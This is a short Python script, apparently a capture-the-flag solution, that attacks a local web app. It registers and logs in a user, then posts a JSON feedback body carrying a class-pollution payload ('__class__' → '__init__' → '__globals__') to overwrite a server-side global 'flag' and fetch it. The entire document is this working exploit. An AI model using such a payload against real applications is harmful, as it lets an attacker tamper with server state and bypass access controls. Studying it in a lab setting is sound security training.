#!/bin/env python3

import requests
TARGET='http://localhost:1337'

requests.post(f"{TARGET}/register", data='username=a&password=a', headers={"Content-Type": "application/x-www-form-urlencoded"})
session = requests.Session() # store cookies
session.post(f"{TARGET}/login", data='username=a&password=a', headers={"Content-Type": "application/x-www-form-urlencoded"})

payload = {
	"title":"",
	"content":"",
	"rating":"",
	"referred":"",
	"__class__": {
		"__init__":{
			"__globals__":{
				"flag": "true"
			}
		}
	}
}
session.post(f"{TARGET}/save_feedback", json=payload , headers={"Content-Type": "application/json"})
r = session.get(f"{TARGET}/get_flag", json=payload)
print(r.content.decode())
